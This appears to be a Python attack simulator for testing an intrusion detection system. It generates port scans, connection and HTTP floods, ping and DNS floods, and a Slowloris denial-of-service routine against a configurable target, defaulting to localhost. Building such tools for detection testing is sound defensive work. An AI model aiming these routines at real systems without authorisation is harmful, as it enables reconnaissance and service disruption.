#!/usr/bin/env python3
"""
Network Attack Simulation Script for IDS Testing
Run this in a separate terminal while IDS is running
"""

import socket
import threading
import time
import random
import sys
import subprocess
import argparse
from datetime import datetime

# Colors for output
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
RESET = '\033[0m'

def print_banner():
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════╗
║           IDS TEST ATTACK SIMULATOR - EDUCATIONAL USE        ║
╚══════════════════════════════════════════════════════════════╝{RESET}
{YELLOW}⚠️  Run this ONLY on your own network/machine!{RESET}
    """)

# ============================================================================
# ATTACK 1: PORT SCAN
# ============================================================================
def attack_port_scan(target_ip, ports=None):
    """Simulate port scanning (should be detected as port_scan)"""
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 443, 3306, 3389, 5432, 8080, 8443, 8000, 5000, 3000, 9000]
    
    print(f"{BLUE}[*] Starting PORT SCAN on {target_ip}{RESET}")
    open_ports = []
    
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"    Port {port}: {GREEN}OPEN{RESET}")
            sock.close()
            time.sleep(0.05)  # Fast scan pattern
        except:
            pass
    
    print(f"{GREEN}[✓] Port scan completed. Found {len(open_ports)} open ports.{RESET}\n")
    return open_ports

# ============================================================================
# ATTACK 2: SYN FLOOD (Half-open connections)
# ============================================================================
def attack_syn_flood(target_ip, target_port=80, count=50):
    """Simulate SYN flood with many half-open connections"""
    print(f"{RED}[*] Starting SYN FLOOD on {target_ip}:{target_port}{RESET}")
    
    def send_syn():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            # Connect but don't complete handshake
            sock.connect_ex((target_ip, target_port))
            time.sleep(0.01)
            sock.close()
        except:
            pass
    
    threads = []
    for i in range(count):
        t = threading.Thread(target=send_syn)
        t.start()
        threads.append(t)
        if i % 10 == 0:
            print(f"    Sent {i+1}/{count} SYN packets")
        time.sleep(0.02)
    
    for t in threads:
        t.join(timeout=1)
    
    print(f"{RED}[✓] SYN flood completed. {count} SYN packets sent.{RESET}\n")

# ============================================================================
# ATTACK 3: BRUTE FORCE SIMULATION
# ============================================================================
def attack_brute_force(target_ip, target_port=22):
    """Simulate brute force login attempts"""
    passwords = [
        "admin", "password", "123456", "root", "toor", 
        "qwerty", "abc123", "letmein", "welcome", "admin123",
        "password123", "root123", "adminadmin", "passw0rd"
    ]
    
    print(f"{YELLOW}[*] Starting BRUTE FORCE simulation on {target_ip}:{target_port}{RESET}")
    
    for i, password in enumerate(passwords[:15], 1):
        print(f"    Attempt {i}: admin:{password}")
        # Simulate connection attempt
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect_ex((target_ip, target_port))
            sock.close()
        except:
            pass
        time.sleep(0.1)  # Rapid attempts
    
    print(f"{YELLOW}[✓] Brute force simulation completed. {len(passwords[:15])} attempts.{RESET}\n")

# ============================================================================
# ATTACK 4: HTTP FLOOD (DDoS simulation)
# ============================================================================
def attack_http_flood(target_ip, target_port=80, requests=100):
    """Simulate HTTP flood attack"""
    print(f"{RED}[*] Starting HTTP FLOOD on {target_ip}:{target_port}{RESET}")
    
    paths = ['/', '/index.html', '/admin', '/login', '/api', '/test', '/home', '/about']
    
    def send_request():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((target_ip, target_port))
            
            path = random.choice(paths)
            request = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
            sock.send(request.encode())
            sock.close()
        except:
            pass
    
    threads = []
    for i in range(requests):
        t = threading.Thread(target=send_request)
        t.start()
        threads.append(t)
        if i % 20 == 0:
            print(f"    Sent {i+1}/{requests} requests")
        time.sleep(0.01)
    
    for t in threads:
        t.join(timeout=1)
    
    print(f"{RED}[✓] HTTP flood completed. {requests} requests sent.{RESET}\n")

# ============================================================================
# ATTACK 5: ICMP FLOOD (Ping flood)
# ============================================================================
def attack_icmp_flood(target_ip, count=30):
    """Simulate ICMP flood using ping"""
    print(f"{RED}[*] Starting ICMP FLOOD on {target_ip}{RESET}")
    
    for i in range(count):
        try:
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '1', target_ip],
                capture_output=True,
                timeout=2
            )
            if i % 5 == 0:
                print(f"    Sent {i+1}/{count} pings")
            time.sleep(0.05)  # Rapid pings
        except:
            pass
    
    print(f"{RED}[✓] ICMP flood completed. {count} pings sent.{RESET}\n")

# ============================================================================
# ATTACK 6: SLOWLORIS (Slow HTTP attack)
# ============================================================================
def attack_slowloris(target_ip, target_port=80, connections=30):
    """Simulate Slowloris attack with partial HTTP headers"""
    print(f"{PURPLE}[*] Starting SLOWLORIS on {target_ip}:{target_port}{RESET}")
    
    sockets_list = []
    
    for i in range(connections):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, target_port))
            
            # Send partial HTTP request
            sock.send(f"GET /{random.randint(1, 999999)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target_ip}\r\n".encode())
            sock.send(f"User-Agent: SlowLoris\r\n".encode())
            sock.send("Accept-language: en-US,en\r\n".encode())
            
            sockets_list.append(sock)
            print(f"    Connection {i+1}/{connections} established")
            time.sleep(0.1)
        except Exception as e:
            print(f"    Connection {i+1} failed")
    
    print(f"{YELLOW}    Keeping {len(sockets_list)} connections alive...{RESET}")
    
    # Keep connections alive
    for _ in range(5):
        for sock in sockets_list:
            try:
                sock.send(f"X-Header: {random.randint(1, 10000)}\r\n".encode())
            except:
                pass
        time.sleep(1)
    
    # Close connections
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    print(f"{PURPLE}[✓] Slowloris completed. {len(sockets_list)} partial connections.{RESET}\n")

# ============================================================================
# ATTACK 7: DNS AMPLIFICATION SIMULATION
# ============================================================================
def attack_dns_flood(target_ip):
    """Simulate DNS flood with many queries"""
    print(f"{BLUE}[*] Starting DNS FLOOD on {target_ip}{RESET}")
    
    domains = [
        "google.com", "facebook.com", "youtube.com", "amazon.com",
        "microsoft.com", "apple.com", "netflix.com", "github.com",
        "stackoverflow.com", "reddit.com", "wikipedia.org", "twitter.com"
    ]
    
    for i in range(30):
        domain = random.choice(domains)
        try:
            socket.gethostbyname(domain)
            if i % 5 == 0:
                print(f"    Query {i+1}/30: {domain}")
            time.sleep(0.05)
        except:
            pass
    
    print(f"{BLUE}[✓] DNS flood completed. 30 queries sent.{RESET}\n")

# ============================================================================
# ATTACK 8: RAPID CONNECTION ATTACK
# ============================================================================
def attack_rapid_connections(target_ip, target_port=80, count=200):
    """Simulate rapid connection attempts"""
    print(f"{RED}[*] Starting RAPID CONNECTION attack on {target_ip}:{target_port}{RESET}")
    
    def connect():
        for _ in range(20):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((target_ip, target_port))
                sock.close()
            except:
                pass
    
    threads = []
    for i in range(10):
        t = threading.Thread(target=connect)
        t.start()
        threads.append(t)
        print(f"    Started thread {i+1}/10")
    
    for t in threads:
        t.join()
    
    print(f"{RED}[✓] Rapid connection attack completed. ~{count} connections attempted.{RESET}\n")

# ============================================================================
# MAIN FUNCTION
# ============================================================================
def main():
    parser = argparse.ArgumentParser(description='IDS Attack Simulator')
    parser.add_argument('--target', default='127.0.0.1', help='Target IP address')
    parser.add_argument('--attack', choices=['portscan', 'synflood', 'bruteforce', 'httpflood', 
                                              'icmpflood', 'slowloris', 'dnsflood', 'rapid', 'all'],
                       default='all', help='Attack type')
    parser.add_argument('--port', type=int, default=80, help='Target port')
    parser.add_argument('--count', type=int, default=100, help='Number of packets/requests')
    
    args = parser.parse_args()
    
    print_banner()
    
    print(f"{GREEN}Target: {args.target}{RESET}")
    print(f"{GREEN}Target Port: {args.port}{RESET}")
    print(f"{YELLOW}Starting in 3 seconds... Press Ctrl+C to cancel{RESET}")
    time.sleep(3)
    
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{BLUE}Starting Attack Simulations at {datetime.now().strftime('%H:%M:%S')}{RESET}")
    print(f"{BLUE}{'='*60}{RESET}\n")
    
    try:
        if args.attack in ['portscan', 'all']:
            attack_port_scan(args.target)
            time.sleep(2)
        
        if args.attack in ['synflood', 'all']:
            attack_syn_flood(args.target, args.port, args.count // 2)
            time.sleep(2)
        
        if args.attack in ['bruteforce', 'all']:
            attack_brute_force(args.target, args.port)
            time.sleep(2)
        
        if args.attack in ['httpflood', 'all']:
            attack_http_flood(args.target, args.port, args.count)
            time.sleep(2)
        
        if args.attack in ['icmpflood', 'all']:
            attack_icmp_flood(args.target, min(30, args.count // 3))
            time.sleep(2)
        
        if args.attack in ['slowloris', 'all']:
            attack_slowloris(args.target, args.port, min(20, args.count // 5))
            time.sleep(2)
        
        if args.attack in ['dnsflood', 'all']:
            attack_dns_flood(args.target)
            time.sleep(2)
        
        if args.attack in ['rapid', 'all']:
            attack_rapid_connections(args.target, args.port, args.count)
            time.sleep(2)
        
        print(f"\n{GREEN}{'='*60}{RESET}")
        print(f"{GREEN}✓ All attack simulations completed!{RESET}")
        print(f"{GREEN}{'='*60}{RESET}")
        
        print(f"""
{YELLOW}Expected IDS Detections:
- Port Scan: Multiple connection attempts to different ports
- SYN Flood: Many half-open TCP connections
- Brute Force: Repeated authentication attempts
- HTTP Flood: High volume of HTTP requests
- ICMP Flood: Many ping requests
- Slowloris: Slow, partial HTTP connections
- DNS Flood: Many DNS queries
- Rapid Connections: High rate of connection attempts{RESET}
        """)
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}⚠️ Interrupted by user{RESET}")
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

if __name__ == "__main__":
    main()
